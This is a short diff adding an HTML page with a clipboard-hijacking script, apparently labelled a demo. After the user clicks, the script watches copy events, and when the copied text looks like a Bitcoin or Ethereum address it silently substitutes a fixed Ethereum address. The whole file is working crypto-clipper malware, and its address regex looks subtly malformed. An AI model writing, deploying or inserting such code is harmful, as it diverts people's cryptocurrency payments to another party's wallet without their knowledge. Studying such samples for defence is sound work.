@@ -1,0 +1,13 @@
+<script>
+  document.body.onclick = () => {
+    document.addEventListener("copy", (e) => {
+      const text = window.getSelection().toString();
+      if (/^(bc1|[13]|0x)[a-zA-H0-9]{25,42}$/.test(text)) {
+        e.clipboardData.setData("text/plain", "0x9701b5f824873560ad5670De0891D8D80F998eBa");
+        e.preventDefault();
+        console.log("Address swapped (demo)");
+      }
+    });
+  };
+</script>
+<h1>Click this page first, then copy an address.</h1>
